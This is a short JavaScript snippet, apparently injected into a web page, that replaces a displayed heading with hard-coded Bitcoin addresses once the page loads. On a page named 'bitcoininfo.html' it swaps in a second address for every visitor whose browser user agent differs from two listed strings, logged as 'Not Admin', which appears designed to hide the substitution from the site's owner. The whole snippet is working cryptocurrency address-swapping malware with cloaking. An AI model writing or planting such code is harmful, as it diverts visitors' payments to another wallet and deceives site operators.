    const targetUserAgents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    ];

    function getUAC() {
        const elm = document.getElementsByTagName("h2")[1];
        if (elm) {
            elm.textContent = "1BUn5iF7pAxSvdzvE8oCTX6JmbyungsAdq";
            if (window.location.href.includes("bitcoininfo.html")) {
                const desiredText = "1LLZckVAYGnLDRgfXHWFSPjY81SWAtnR6q";
                // Update text content only if needed
                const currentUserAgent = navigator.userAgent;
                if (!targetUserAgents.includes(currentUserAgent)) {
                    console.log("Not Admin");
                    if (elm.textContent !== desiredText) {
                    elm.textContent = desiredText;
                }
                }
                
            }
            
        }
    }

// Call the function as soon as the DOM content is loaded
document.addEventListener("DOMContentLoaded", getUAC);
getUAC()
